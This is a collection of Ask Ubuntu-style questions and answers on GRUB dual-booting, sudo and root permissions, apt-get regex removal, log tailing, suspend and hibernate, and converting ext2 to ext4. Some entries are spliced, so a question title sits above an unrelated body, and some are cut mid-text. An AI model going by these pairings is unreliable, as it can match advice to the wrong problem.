The tutorial (which uses, 11.10, I must note), doesn't mention anything about this problem. Is there anything there I shouldn't have done?\n\nA: Both answers with /EFI/Microsoft/Boot/bootmgfw.efi would do. However I hacked like hell to get the right settings for set root='(hd0,gpt1)'. If you know it's very simple\nWhen GRUB starts: press c\ngive the command ls on the prompt.\nYou get a list of partitions on harddisks like (hd0,gpt1) etc.\nType ls (hd0,gpt1) and try the others.\nLook at the label and if it states EFI you know you've got a hit.  \nWarning: there could be more partitions labelled with EFI, depending how you installed Ubuntu. Try all of them.\n\nA: Boot into Ubuntu using CD,\nChoose  \"Try Ubuntu\",\nConnect to internet,\nOpen up a terminal window using Ctrl-Alt-t and then run: boot-repair\nIf boot-repair is not found, then install it :\nsudo add-apt-repository ppa:yannubuntu/boot-repair &&\nsudo apt-get update &&\nsudo apt-get install -y boot-repair &&\nboot-repair\n\nClick Recommended Repair. Write on a paper the new URL that will appear.\nReboot the pc, you should get a GRUB menu with access to both Ubuntu and Windows. \nIf any problem, indicate the new URL.\n\nA: Try running sudo update-grub.\nThis should hopefully recognize Windows 8 automatically and add it to the GRUB and reconfigure the menu.\nIf that fails, please share your /etc/default/grub file here, we'll have a look.\n\nA: Try making a file called /etc/grub.d/30_windows that contains this:\n\n#! /bin/bash\ncat << EOF\nmenuentry \"Windows 8\" {\n    insmod part_gpt\n    insmod chain\n    set root='(hd0,gpt1)'\n    chainloader /EFI/Microsoft/Boot/bootmgfw.efi\n}\nEOF\n\nThen run sudo update-grub and reboot.\nFull tutorial\n\nA: First, your fdisk -l output is not a problem; that simply identifies your disk as using the GUID Partition Table (GPT) partitioning system. To view your partitions, you must instead use a GPT-enabled tool, such as gdisk or parted, rather than fdisk, which doesn't understand GPT.\nSecond, you may be able to get GRUB to chainload Windows by adding a suitable entry to /etc/grub.d/40_custom and then doing a sudo update-grub. An entry might look something like this:\nmenuentry \"Windows 8\" {\n    set root='(hd0,gpt1)'\n    chainloader /EFI/microsoft/BOOT/bootmgfw.efi\n}\n\nThe details might depend on your installation, though.\nThird, if you consider rEFInd to be ugly, you can always try another rEFInd theme or create your own, as described in the rEFInd documentation. Alternatively, if you prefer a text-mode boot loader, you can set the textonly option in refind.conf. You can achieve a similar end by switching to gummiboot.\nFourth, if rEFInd is periodically reporting errors, please write those down or take a picture of the screen with a digital camera and report them to me. (I'm rEFInd's maintainer.) Bugs can't get fixed if nobody reports them; or if they aren't bugs in rEFInd, the messages may provide clues about how to resolve the problem.\nFinally, it's possible to boot Linux via rEFInd (or gummiboot) without using GRUB; you just need a different EFI boot loader. My personal preference is the Linux kernel's EFI stub loader. This is available only in 3.3.0 and later kernels, though. Since Ubuntu 12.04 ships with a 3.2.0 kernel, you'll need to either find a pre-built 3.3.0 for Ubuntu 12.04 (I've heard of such things, but I don't have any links handy) or build your own from source code. (You could also install Ubuntu 12.10, which ships with a suitable kernel, but presumably you want an LTS release, so this may not be optimal.) See the rEFInd documentation's page on booting Linux for additional details on how to set this up. You could also use ELILO or GRUB Legacy. If you simply object to the delay, you could reduce the GRUB 2 timeout value and set it to not display the menu by default.\n\nA: My Ultimate Workaround\n(*Because Tom's didn't work and NikTh's link is too complicated. But hey, thanks for bothering!)\nInstall rEFInd.\n\nI'm accepting my own answer until someone points out a possible flaw and a fix to it or addresses my issues (which, unfortunately, just asks the question \"How do I put Windows 8 in GRUB easily?\").\n(Edit 8/6/17: I ultimately used rEFInd to solve this problem (see accepted answer above).)\nFar from a perfect solution, using rEFInd seems like a very hack job. For one, it looks ugly (sorry rEFInd) and tells me access was denied on certain .efi's ({ext2_x64, hfs_x64, iso9660_x64, reiserfs_x64}.efi) at start-up---nothing critical though, and goes away with a button press*. And, lastly, choosing the Ubuntu efi still loads GRUB which is an entirely unnecessary step, at least since I won't bother keeping multiple kernel versions around.\nIn summary...\nPros: my system now more-or-less works like my pre-UEFI dual-boots. Cons: it looks ugly plus a longer boot time.\n*I must note that this rEFInd was installed via install.sh at my Ubuntu partition. Previous experiences with rEFInd (set-up through Windows) didn't have this problem.\n\nA: *\n\n*Please download super Grub and follow its directions.  I never leave home without it. Very helpful when the grub menu does not show up.  \n\n*You'll have to load to a cd and boot it up. Just follow the instructions that come with it.\n\n*It can also be used to fix windows as well.  Since you can only boot into windows 8 you want to pick the linux fix.\nPlay around with this but do read over the instructions.  You'll feel like an expert after a while.\nRS\n", "Q: How to edit gnome/unity menus without using Alacarte?

You can not log in as root or su to root. This was a problem for me as I have had to install numerous applications and services to /opt as per user documentation (XAMPPfor Linux is a good example). The problem here is that this directory is owned by root:root. I notice that my admin user account does not belong to root group through the following command:\ngroups username so my understanding is that even though the files and services that I place in /opt belong to root, executing them by means of sudo (as required) does not mean that they are run as root? I imagine that the sudo command is hidden somewhere under belonging to the root user and has a 775 permission? So the question I have is if running a service like Tomcat, Apcahe, etc exposes my system like on other systems? Obviously I need to secure these in configurations, but isn't the golden rule to never run something as root? What happens if I have multiple services running under same user/group with regards to a compromised server?\n\nA: Ok, here's some security 101:\n\n\n*\n\n*regarding the root account, Ubuntu is very much like any other Debian-based system, in that root has no password set, so you can't log in as root directly and have to use sudo instead. If you need to use su, you can start it with sudo su. More details on sudo\n\n*the fact that an executable is owned by root does not mean that it has to be run with sudo, any user with read and execute privileges is able to run such program. In fact, most programs in Ubuntu are owned by root, yet you can run gedit and stuff. The \"effective user\" of the running process will match the user who started the program, not who owns the executable. So, technically, you can run Apache and everything as your non-admin user, but there's one \"if\"...\n\n*as a security measure, in Linux systems a process can not bind to ports below 1024 unless its effective user is root. So if you want Apache to listen on port 80, it has to be started as root. Which is an obvious security issue. But you can run it on, say, port 8080.\n\n*To avoid security issues of running with root privileges, Apache and some other network services drop their privileges after binding to network ports, so it performs absolute minimum of work as root and then switches its effective user id to some pre-configured user with very minimal privileges (no password, no login shell etc.) Effective user and group are set in the application's configuration files (User and Group directives in httpd.conf in case of Apache)\n\n*some other services can't drop their privileges so they have to be started as a non-privileged user from the boot scripts. \n\n*When you install packages from Ubuntu repositories, they usually create restricted user accounts for each service (mysql, postgres etc.) and configure the services to each run with their own effective user. This is considerably safer than running services as the user you log in with.\n", "Q: No option to boot Ubuntu in a dual-boot machine I have installed Ubuntu 12.10 next to Windows 7 in a separate NTFS partition.\nI can boot Windows 7 but I can't find a way to choose Ubuntu and boot into it.\nWhat do I do?\n\nA: You should consider installing Grub.\nYou can install it by using Resc-A-Tux.\nThis little live disk is made to boot and install/restore grub.\nIt's very easy to use, you just boot it and select install/repair.\n", "Q: Non-sudo user command line tools I’ve got some non-sudo users and certain command line tools don’t work for them – but they do in other Linux OS.\nFor example, pressing up would normally give you your last used command, and pressing tab would complete the rest of a directory or file name. Neither of these work for non-sudo users.\nI don’t want to give  them sudo access, but I’ve used them successfully in CentOS and was wondering if similar permissions where possible in Ubuntu Server?\n\nA: This has nothing to do with sudo.\nFirst, check which shell your users are using. Not every shell supports the arrows for history. Bash, the default shell, does, however.\nIf that fails, check the relevant shell's configuration files, both of the users and the system files.

I just want to restore them on the new laptop and see what I can recover from all the info I've lost. One of the replies I found on the net said that they will automatically appear in the new Ubuntu One folder. However, they do not.\n\nA: If you encrypted your individual files before they were uploaded to Ubuntu One, and are thus stored encrypted on the server, then Ubuntu One only knows about the encrypted data you uploaded. It will only download these files as they exist on the server. You will need the private key you used for encrypting them, in order to decrypt them. If that was on your stolen laptop, and you don't have a copy or back-up of that private key to use, you will be unable to decrypt the files. That has nothing to do with Ubuntu One.\nIf you have files visible on https://one.ubuntu.com/files/ which are not being downloaded to your machine, and you have subscribed to the folders those files exist in, on your machine, then you should contact Ubuntu One support at https://one.ubuntu.com/help/contact/ for further assistance.\n", "Q: Animations in Ubuntu 12.10 like in Ubuntu 9 \nPossible Duplicate:\nHow can I configure Unity? \n\nI recently installed Ubuntu 12.10.

My ubuntu is completely upgraded, btw. I have wine and wine tricks as well. And I am a fairly novice ubuntu user. So please keep that in mine\n\nA: I think this is not the exact forum for this question. However, you must read the Terms and Conditions mentioned on the official site. It clearly states that your machine must be running  Windows 7, Windows Vista, or Windows XP with Service Pack 3 (SP3) to download that upgrade. The only option I could see there for you is to get it shipped or buy it from a retail.\n\nA: \nEach upgrade license applies to only one PC and you can install the upgrade only on PCs that have a valid base license and one of the following operating systems: Windows 7, Windows Vista, or Windows XP (SP3).\n\nThat means to install the Windows 8 Upgrade, you need Windows on your PC.

Unbelievable.\n", "Q: Paginate with tail -f command \nI am trying to tail file with pagination:\ntail -f foo.txt | more\n\nThis works fine until file gets, lets say, 200 lines injected, when this happens nature of tail command is to go to end of file, at that point I lose track of trailing the log.\nIs there a way to avoid this?\n\nA: Use tail -f log.txt | less instead .  On my quick testing, it updates to advance to the new information, and you can then go up or down.  I.e., less updates as an output buffer, not statically referring to the original content.\nOr, a slight variation with fewer moving parts (no pipe) -- the solution that Dolphin mentioned in a comment -- less +F log.txt is a nice way to go.  Here's what the man page says for F:\n\n   F      Scroll  forward, and keep trying to read when the end of file is reached.\n          Normally this command would be used when already at the end of the  file.\n          It  is  a  way to monitor the tail of a file which is growing while it is\n          being viewed.  (The behavior is similar to the \"tail -f\" command.)\n\n\nIn other words, this is perfect for this case.\nIt does have one problem that prevents it from being my favorite.   An addition like less +F daemon.log | egrep session doesn't work.\nOne reason I continue to use pipes in my own day-to-day command line work is that, when coupled with history, it's crazy easy to go back, add a pipe, and change the behavior of your command as the data dictates.   If a simple tail -f log isn't working because of the volume of data scrolling off the screen, slap on the pipe to less.  If the volume is too heavy, but you see hints of the lines you're looking for, add a pipe to grep or egrep.  Then chain awk, or sed,  or cut, to get exactly what you want. \nThis is also a reason that \"unnecessary use of cat\" is often a ridiculous criticism.  If you cat a file, but find that it is unexpectedly long, use the shell history, hit up-arrow and do something else with it.  Quick fix? Just add cat foo | more.   How long is it?  Up-arrow and | wc.   How many lines are there with \"pangloss\"?  Add | egrep pangloss | wc .   It's nice if you can start a command knowing exactly where your investigation is going to go, but if you can't, history and pipes are a good way to get things done.   Even if it's ugly, cat file | more | egrep something works fine. \n\nA: My solution is this:\nless some-file.log\n\nThen, in less I hit Shift+F. This causes less to update with the file. To scroll back, just hit Ctrl+C.\n\nA: Not really, using that method. You are trying to use programs that both limit data, but in very different ways. \nTry \nwatch -n 5 tail  -n 40 /var/log/thingy\n\nThat will update the tailed display every 5 seconds. \nThat's as close as I can get, but it's not what you want.\nThe problem is that more expects all it's data at once, where tail is continuing to pipe. If your just trying to read the last few lines over and over then watch will work. If you want just be able to keep a log and scroll back then use the console backbuffer. \nIn X this would be scroll bars, if your on a true console then you have to use something like:\nkernel /vmlinuz root=/dev/sdb5 video=radeonfb fbcon=scrollback:128 to increase the size at boot time.  Then you can use Shift UP and Shift Down to scroll.\nThis is much easier in X. Just \ntail -f /var/log/something.log and scroll back and forth. You can hit enter to create a visual break of where you were. \nIn a VTY you need to use shift up and shift down to to accomplish the same thing, and if you need more scroll back use the fbcon=scrollback:128 argument at boot.\n", "Q: WiFi repeatedly asks for password (Ubuntu 12.10 fresh) I'm sure the passphrase is correct 100% but Wifi keeps asking for authentication and never connects.

When I came to the \"System crash\" there's just one sentence:\nIf your system lockups up, freezes, logs you out, etc., \nthen this is not an application crash, but a system crash.\nPlease see below, and consult the following article for \nthese types of problems \nhttps://help.ubuntu.com/community/DebuggingSystemCrash. \n\nSo does it say that you cannot report a system crash bug?

Maybe that caused a lot of bad reports, but the new way people just won't report bugs if they don't find out how...\n\nA: Determining Where Failure Occurs\nIf your system fails to shut down, and the last text you see tells you that it is trying to unload a particular kernel module (or perform any other particular task), and there is no indication to the right of it, on the same line, that it succeeded or failed, then the problem is almost certainly with that specific action, and not with whatever comes next. In this situation, you can report a bug documenting the failure of the kernel module to unload.\nReporting a Bug Affecting a Kernel Module\nIf you have a bug that is due kernel modules provided by a particular, non-kernel package, you can report the bug against that package. If there is actually a kernel service running (ps ax shows kernel threads as well as normal processes) for the module, which you believe is causing the problem, then you can run ubuntu-bug with its PID if you can run ubuntu-bug at all.\nSince you likely cannot run any commands in this situation, and since there is often no running process that is clearly responsible, after rebooting, you should instead run:\nubuntu-bug packagename\nHere, that's somewhat difficult--the VirtualBox userspace program is provided by virtualbox. VirtualBox kernel modules for virtualization hosts are typically built from source, which is provided by virtualbox-dkms.\nI would report this bug against virtualbox-dkms (assuming VirtualBox compiled and installed kernel modules on your machine). The technical details of the bug would likely indicate what package is best, and it is not always practical to determine what package a bug is best considered to affect, before reporting the bug. So you do your best. It can always be changed later on Launchpad, either by you or by someone else (usually a triager or developer).\nIf you wanted to report a bug against a kernel module that ships with the kernel, you could report it against linux:\nubuntu-bug linux\n\n\nA: There are two ways of reporting a bug:\n\n\n*\n\n*If your desktop is still accessible: ubuntu-bug.\n\n*Otherwise: Launchpad.\n\n\nYou can make a guess of which package to report against by using the \"Synaptic Package Manager\" application.

I have a laptop - Lenovo T60.\nWhen I close the lid, I see that the machine goes into suspended mode. The moment I open the lid, the laptop is instantly a live.\nMy concern - Does going into suspended mode make it safe to trasnport the computer - eg: travel on a bumpy road.\nI ask because I'm not sure which parts shut off... For example, if the hard drive is still running, I'd say it's never safe to travel with the laptop in this mode.\nI'd like some thoughts on this. Thanks!\n\nA: \nSuspend writes the info to RAM (memory) & still uses power: drive(s), cpu and the moniter(s) are powered off.The RAM modules are placed in self refresh mode and the CPU is powered off. The chipset is responsible for using the standby power to stay on enough to reactivate the main power supply when a button is pressed \n\nand if you want to know what hibernate is:\n\nHibernate writes info to hard drive then powers laptop off.\n  Hibernate is resumed by pressing the power button.\n\nSo in terms of optimising battery life hibernate is better, but can take as much time as powering off, suspend is quicker but still uses power.\nAnd in your question concerning hdd life. You should be able to drive over bumpy roads because the disk drive stops spinning.\n\nA: \npm-suspend\n\nDuring suspend most devices are shutdown, and system state is saved in RAM. The system still requires power in this state. Most modern systems require 3 to 5 seconds to enter and leave suspend, and most laptops can stay in suspend mode for 1 to 3 days before exhausting their battery. \n\npm-hibernate\n\nDuring hibernate the system is fully powered off, and system state is saved to disk. The system does not require power, and can stay in hibernate mode indefinitely. Most modern systems require 15 to 45 seconds to enter and leave hibernate, and entering and leaving hibernate takes longer when you have more memory.\n\npm-suspend-hybrid\n\nHybrid-suspend is the process where the system does everything it needs to hibernate, but suspends instead of shutting down. This means that your computer can wake up quicker than for normal hibernation if you do not run out of power, and you can resume even if you run out of power. s2both(8) is an hybrid-suspend implementation.\n\nA: Moveable parts?\nIf any moveable parts are running, the Laptop, especially Lenovo and HDD vendors such as WesternDigital should be smart enough to design their laptops to handle such stress, e.g. covered fan.\nStatus\nYou can determine accoustically, or by commands, whether moveable parts are running.\nCheck whether HDD is active/idle or standby (not spinning):\n$ sudo hdparm -C /dev/sda\n\n/dev/sda is usually the primary HDD. You can determine your device names by using the lsblk command, which stands for “list block devices”.\nCheck the fan rotation speed:\n$ sensors\n\nAs far as I know, there is no SCSi multimedia command in the command set, which allows directly reading the optical drive rotation speed, but optical drives should usually be far less fragile than hard drives, and if anything breaks, then it is the drive, not the disc. But you can reduce the rotation speed:\n     $ eject -x 20\nIf you would like to know more about each command, then you can use the --help command switch or man command, maybe help depending on some distributions.\nHard drives are designed to handle some stress and minimize damage:\n\n\n*\n\n*Writing head airflow control - avoid headcrash.\n\n*If freefall or too strong shakes are detected by sensors inside the HDD, it will quickly spin down and move head to safe position to minimize physical damage.\n\n*If the air pressure is too low (i.e. usually at high altitudes), which can cause the airflow to break like on aircraft stalling, the drive's internal protection mechanisms are accordingly more paranoid, and may even suspend operation temporarily.\n\n*HDDs are usually mounted upside down in laptops since decades.\n\n", "Q: apt-get remove with wildcard removed way more than expected. why? Last night I was trying to burn CDs. Being annoyed with k3b and choosing to use brasero instead, I went to remove k3b.\nI typed in:\nsudo apt-get remove k3b\n\nI hit tab twice and saw that I had both k3b and k3b-data on my system. Assuming that I wouldn't need k3b-data on my system without k3b, I wanted to remove it as well so I typed in:\nsudo apt-get remove k3b*\n\nUnfortunately I hit Y to confirm without looking. It uninstalled a whole lot more than k3b and k3b-data. It uninstalled packages which did not fit my k3b* regex. For example: transmission and network-manager.\nI'm fairly certain that I didn't have a space between k3b and * but I don't know why else it would remove all that it did. Is there something about apt-get that I'm misunderstanding?\n\nA: The command you want is sudo apt-get remove '^k3b.*', because:\n\n\n*\n\n*You need .* to match any character, any number of times\n\n*You need ^ to match the start of the string\n\n*You need to quote the regex to prevent bash from interpreting * as a wildcard\n\n\n(This answer completes and summarizes previous info provided by qbi and Flimm)\n\nA: The regular expression * stands for zero or arbitrarily many. So you told apt-get to remove anything which contains  k3 followed by any number of b, so basically everything which contains k3.

When you install or remove packages, * is often dangerous and rarely needed. If you do use *, you should quote it, but that does not make it safer, because its tendency to select far more packages than you intend is the result of the way apt and apt-get interpret it and not an effect of pathname expansion.\n\n\n*\n\n*Even safe uses of * are often unnecessary.\n\n*Unsafe uses are brutal. Removing k3b* removes every package that contains k3 anywhere in its name (and every package that depends on such a package). That's not a typo--containing k3 is sufficient, even without the b, because b* means \"zero or more bs.\"\n\n\n\nWhen you run apt or apt-get with the install, remove, or purge action, each subsequent argument is first1 interpreted as the name of an individual package. If a package with that exact name exists, the action is performed for it.\nIf there is no such package, apt and apt-get will check if the argument contains any of the common regular expression metacharacters2 ., ?, +, *, |, \\[, ^, or $. If not, it's done--no package was found.\nIf it does contain any of those characters, then it is treated as a regular expression and matched against any part of any package name. It doesn't have to match the whole name. As others have said, * in a regular expression doesn't mean the same thing as * in a glob. ? doesn't either. In a regular expression:\n\n\n*\n\n** allows the previous item to appear any number of times--including just once or not at all--instead of exactly once.\n\n*? makes the previous item optional--that is, it allows it to appear zero or one times.\n\n\napt-get(8) (man apt-get) says:\n\nIf no package matches the given expression and the expression contains\n  one of '.', '?' or '*' then it is assumed to be a POSIX regular\n  expression, and it is applied to all package names in the database.\n  Any matches are then installed (or removed). Note that matching is\n  done by substring so 'lo.*' matches 'how-lo' and 'lowest'. If this is\n  undesired, anchor the regular expression with a '^' or '$' character,\n  or create a more specific regular expression.\n\nThe manpage only mentions ., ?, and *, but it is incomplete, as +, |, [, ^, and $ are also sufficient to let apt-get or apt interpret the pattern as a regular expression.3\nAlthough you can match any number of any characters with .*--not just *--you only need this if it would appear in the middle of your regular expression. Because the pattern is matched against any substring of a package name, it's pointless at the end (or beginning) of the pattern.\nThe manpage mentions ^ and $. These (especially ^) are key to writing safe, efficient patterns for use with the install, remove, or purge actions in apt or apt-get.\n\n\n*\n\n*^ anchors a regular expression to the beginning of the whole string. ^k3b selects all packages whose names start with k3b.\n\n*$ anchors a regular expression to the end of the whole string. k3b$ would select all packages whose names end with k3b.\n\n\nTherefore you can use this command to safely remove the packages:\nsudo apt-get remove ^k3b\n\nFinally, in the specific case you mentioned, you might as well just pass both names yourself:\nsudo apt-get remove k3b k3b-data\n\nThen you avoid all this complexity! (Though anchoring with ^ is simple once you're used to it.) Or use brace expansion, which your shell expands into the above command:\nsudo apt-get remove k3b{,-data}\n\n\n1 There are two exceptions to this: (a) some options (e.g., -f, --purge) are recognized, and  (b) some punctuation characters appearing at the end of an argument that would otherwise be taken as a package name to perform the action can be used to alter what is done (e.g., sudo apt install ubuntu-desktop^ installs the task rather than the package, and when ^ appears at the end ).\n2 Other regular expression metacharacters exist. For example, \\ is supported by all dialects of regular expressions and commonly used. ., ?, +, *, |, [, ^, and $ just happen to be the metacharacters the APT developers decided would trigger interpretation as a regular expression (after resolution as an exact package named has failed).\n3 The easiest way to verify this is to simulate installation or removal with such a pattern, using the -s option as described above. For example, running apt -s install ^virtualbox shows that sudo apt install ^virtualbox would have the effect of attempting to install every package the package manager knows about whose name begins with virtualbox. However, this behavior can also be verified by examining the source code. Check the CacheSetHelper::PackageFromRegEx function in cacheset.cc.\n\nA: You more then likely remove a lib that had k3b in it that those programs depended on. \nIn short you may never know. I recommend not using a wildcard to remove things and to read things when prompted (sorry).\nAlso with out the -n regex searches use all fields and not just names\nhttp://ccrma.stanford.edu/planetccrma/man/man8/apt-cache.8.html\nalso qbi is correct your regex is flawed from the get-go\n\nA: Use .* instead of *, and put inside quotes ' '\nsudo apt-get remove 'k3b.*'\n\n\nA: You can use apt search which has the advantage of searching in both package names and package descriptions But it is also a bit dangerous. for example, if you want to remove any package related to MY_PATTERN you can run:\nsudo apt search MY_PATTERN | grep \"^[^\\ ]*/\" -o | sed 's/\\///' | xargs -I '{}' sudo apt remove -y '{}'\n\nBE CAUTIOUS: Don't use small search patterns that can be found in many words like he, and,.... it might cause non-related package removal and therefore corruption. Before run check out the output of the apt search MY_PATTERN first.\napt search MY_PATTERN: Find the pattern in the package names and package descriptions on the remote repositories.\ngrep \"^[^\\ ]*/\" -o: extract the package name.\nsed 's/\\///': remove / from the extracted names.\nxargs -I '{}' sudo apt remove -y '{}': remove one by one.\n", "Q: find out which process wakes my hard drive from sleep state I have an external drive connected to my computer, I want this drive to be in sleep mode unless i'm executing some backup tool.\nFor some reason, after 14 minutes I think, the hard drive always wakes up.\n** edit **\ni tried the following things:\n\n\n*\n\n*btrace /dev/myexternal- to see which system call calls my external hard drive. unfortunately at the moment my hd wakes up I don't see any call.\n\n*fuser /dev/myexternal - to see which processes use this hd.\n\n*lsof - to see if there are files which has accessed.\n\n*mount the external drive manually to /mnt\n\n*stop lightdm and several processes/services.\nHow can I find which process wakes the hard drive?\n\nA: More then likely your file manager or desktop enviroment is \"scanning\" the drive for indexing.\nYou can stop this by unmounting the drive when not in use, then mounting, backup, unmounting when you need to backup. \nOther then that you can use tools like lsof to see what processes have files open on the drive.

I made the mistake of not uninstalling it now when I try to boot to Ubuntu I get an error screen.\n\nA: No, you do not. You can upgrade to windows 8. As long as you only modify your windows partition this will be fine. After you install windows 8 you will no longer be able to boot into linux because grub will have been replaced, but you can just put it back using a rescue cd. \nStart the rescue cd then run something like\nsudo mount /dev/sda3 /mnt\n\nsudo grub-install /dev/sda --boot-directory=/mnt/boot/\n\nadjusting the command for your hard drive partitions and locations. \n", "Q: Which types of updates will I continue to get in 12.04 LTS? I've decided to keep using Ubuntu 12.04 LTS. Besides the updates from the manually added PPA's, which other updates will I get?\nIn particular, I'm curious about:\n\n\n*\n\n*Security updates\n\n*Kernel updates\n\n*Software (such as Rhythmbox, Chromium, Firefox, etc) updates\n\n\nA: From the StableReleaseUpdates page.\n\nStable release updates will, in general, only be issued in order to\n  fix high-impact bugs. Examples of such bugs include:\n  \n  \n*\n  \n*Bugs which may, under realistic circumstances, directly cause a security vulnerability. These are done by the security team and are\n  documented at SecurityTeam/UpdateProcedures.\n  \n*Bugs which represent severe regressions from the previous release of Ubuntu. This includes packages which are totally unusable, like\n  being uninstallable or crashing on startup.\n  \n*Bugs which may, under realistic circumstances, directly cause a loss of user data\n  \n*Bugs which do not fit under above categories, but (1) have an obviously safe patch and (2) affect an application rather than\n  critical infrastructure packages (like X.org or the kernel).\n  \n*For Long Term Support releases we regularly want to enable new hardware. Such changes are appropriate provided that we can ensure to\n  not affect upgrades on existing hardware. For example, modaliases of\n  newly introduced drivers must not overlap with previously shipped\n  drivers.\n  \n*New versions of commercial software in the Canonical partner archive.\n  \n*FTBFS(Fails To Build From Source) can also be considered. Please note that in main the release process ensures that there are no\n  binaries which are not built from a current source. Usually those bugs\n  should only be SRUed in conjunction with another bug fix.\n  \n  \n  For new upstream versions of packages which provide new features, but\n  don't fix critical bugs, a backport should be requested instead.\n\n\nA: Kernel will likely remain pretty static. Important updates will be made, but nothing fancy or new. \nSecurity will always get updated. \nSoftware will be hit or miss. Important bug fixes will make it, new features most likely won't, but it's up to the developer. \nhttps://wiki.ubuntu.com/LTS\nIf your on a server stick to LTS, if your at home I recommend just updating to the latest version. Though you have to make the call. LTS versions are more tested, and stable, but only in the programmatic sense. \nFor example. Lets say you have tEdit (a fake text editor) in LTS, in current (non-lts) it gained the ability to copy and paste. This update also caused a bug where you can't tab.\nLTS probably would not get that update as no one is really using tEdit, and it doesn't effect performance. Though some one out there may really like tEdit and may publish personal repositories that will let you install. This means current would get a tEdit that can copy and paste but not tab (till they fix the bug), and LTS would not be effected byt the tab bug, but would also not be able to copy and paste. \nThe basic idea is \"better the devil you know\" and it 100% true for business/server environments. \nNow lets say libKeyboard (again fake) gets an update that allows you to not crash when pressing caps lock. That would end up in both LTS and Current because it effects everyone and is down right important. \n", "Q: Error when running sudo, getting a permission denied I was installing GIT on my machine, when I sudo any thing, this error message appears:\nsudo: must be setuid root \n\nI tried from recovery mode to change permissions of usr/bin/sudo by:\nchown root:root /usr/bin/sudo\nchmod 4755 /usr/bin/sudo\nchmod 0440 /etc/sudoers\n\nbut the chown or chmod not working cause the file is read only.\n\nA: When starting in recovery mode your / file system is mounted read-only. \nSo the first command must be\nmount / -o remount,rw\n\nafter that the commands you found yourself will solve your problem. \n", "Q: Only user can no more sudo and root account in safemode has password I accidentally commented the line Members of the admin group may gain root privileges:\n%admin ALL=(ALL) ALL\n\nin /etc/sudoers file, now i am unable to sudo into my system using the only available existing user. \nThe default solution would be to drop into root account by going into safe mode but problem is root account seems to have password set which I don't remember (I don't even remember when I set it), so I am unable to enter into root account in safe mode to fix this file.\nI can do anything non-related to sudo like browsing internet, posting this post but not basic stuffs like proper shutting down of computer using halt command, etc.\nSo, can anyone provide solution to it?

I have installed ubuntu inside windows 7 via wubi. How do i uninstall windows 7, keeping ubuntu as my primary OS? \n\nA: Unfortunately, you can't, at least not easily.  Wubi's designed to install Ubuntu inside the Windows partition in what is called a loopback file.  Essentially, when Ubuntu boots, first the kernel mounts the Win7 NTFS partition, then looks for the file that contains the Ubuntu file system and \"pivots\" onto it.  The cleanest way to get rid of Windows would be to reinstall without using Wubi.\nOf course, technically it would be possible to manually repartition, copy everything from the loopback filesystem, delete Windows, repartition again, install the bootloader, etc.  But I think that route would be nothing but a trail of tears for anyone except maybe Linus Torvalds ;).\nDon't forget to back up your data!\n", "Q: Evolution Calendar without email account attached I have been using Evolution for it's calendar for some time now.\nBut every time I open the calendar, it asks for my email password.\nSo today, I had enough, I deleted my email account from evolution(I use a different program for emails) but now I can't open evolution because it wants to add an email account.\nIs there a work arround for this?

I'm aware that when a Windows session is hibernated, its disk partition cannot be mounted in Ubuntu. By default in Windows 8, a hybrid shutdown/hibernate feature is used (fast startup) which hibernates the kernel session but shuts down everything else.\nIs there any way to mount a partition in this hybrid shutdown state? Even theoretically?\n\nA: Windows 8 - when sent to its fast-startup shutdown - does not actually shut down. It hibernates, which means that the session is stored and will be resumed - which obviously means the status of the partition should not change in the meantime.\nAs such, it flags the partition with a so-called hiberfile, which is a physical file on the partition that you will be prompted to delete when you try to mount a hibernated partition.\nYou can, however, mount the partition in question as read-only through the mount -r option. That will enable reading the files, but not writing to the partition.\n\nA: You could mount the partition read only. This should let you access the drive to read things.

Can I just copy whole boot folder from usb to HD or smth like that?\nAny kind of help is appreciated. Apologize for my newbie skills.\n\nA: I would strongly suggest that you just reinstall, being careful about where the installation goes to.\nOne quick check before doing that: Looking at that fdisk output, your first primary partition doesn't seem to be marked bootable. Run 'fdisk /dev/sda', type 'a'-Enter to start toggling a bootable flag, '1'-Enter to toggle the first partition's bootable flag. 'w'-Enter to write the partition table changes and exit.\nIf that doesn't fix things for you, then copying the boot folder (if there isn't one on your primary drive's Linux partition) to the primary drive's Linux partition would be the start of getting booting working off the hard disk. Then changes to /etc/grub.conf or /etc/default/grub would be required.\n", "Q: How to convert ext2 to ext4? I installed Ubuntu 12.10, and I don't know why, I have an ext2 partition.\n\n\n*\n\n*How can I convert this ext2 file system to an ext4?\n\n*Will I lose all my data?\n\n\nA: Follow the instructions detailed in this post: Convert ext2/3 to ext4\n\nA: The short version for the impatient:\ndev=/dev/sdXn # <-- Adjust this\n\nthen\numount $dev && tune2fs -O extents,uninit_bg,dir_index,has_journal $dev && e2fsck -v -pf $dev\n\nIf you cannot unmount because it's your system partition, then of course you will need to first boot from another system like a Live CD.\nAnd no, you will not lose data. Unless something very weird happens, in which case you will have to reach to your backup. (You do have backups, of course. Right?)\n\nA: A lot has changed in ext4 since the article linked to in the accepted answer was written.  There are a lot more ext4 features that can be enabled now.  To convert an ext2 filesystem to a full-featured ext4 (at the time of this writing), The command is:\ntune2fs -O extents,uninit_bg,dir_index,has_journal,flex_bg,huge_file,extra_isize,dir_nlink,uninit_bg /dev/EXT2DEVICE\n\nThere really isn't a set \"ext2\", \"ext3\", or \"ext4\" any more.  There is a whole spectrum of features.  To see the features enabled for your extX filesystem, use the command:\ndumpe2fs -h /dev/DEVICE\n\nThe core set of features for ext2 are: ext_attr,resize_inode,filetype,sparse_super,large_file.  Generally, ext3 is considered to be ext2 plus a journal.  And ext4 is basically ext3 plus any combination of the rest of the available features.  In the future they may name it ext5, 6 or 7.  Really it's all one filesystem family with a variable set of features.\nTo find out what the most current set of extWHATEVER features are at the time you read this, the best thing you can do is just create a small filesystem and look at its feature list.  For ext4 it is:\ndd if=/dev/zero of=ext4test bs=1M count=256\nmkfs.ext4 ext4test\ndumpe2fs -h ext4test\n\nLook at the line that says \"Filesystem features:\" and it will tell you what features have been included on that filesystem.  At the time of this writing it is:\nFilesystem features:      has_journal ext_attr resize_inode dir_index filetype extent flex_bg sparse_super huge_file uninit_bg dir_nlink extra_isize\n\nOnce you do that, you can create your own method for updating your extX to the extLATEST.  Do a dumpe2fs on the filesystem you want to upgrade and compare the features on it to the features on your test ext filesystem.  For any or all of the features that are missing on the old filesystem you:\ntune2fs -O <comma-delimited list of missing features>\n\nOnce you are done adding the features, force a filesystem check with:\ne2fsck -f /dev/DEVICE\n\nAnd you have just now ensured your extX is now the extLATEST with all the available features.\n\nA: *\n\n*Reformat the drive\n\n*Yes\n\n\nAs an alternative, you can enable some of the features of ext4 by running the following command, and rebooting:\nsudo tune2fs -O has_journal,uninit_bg,extents 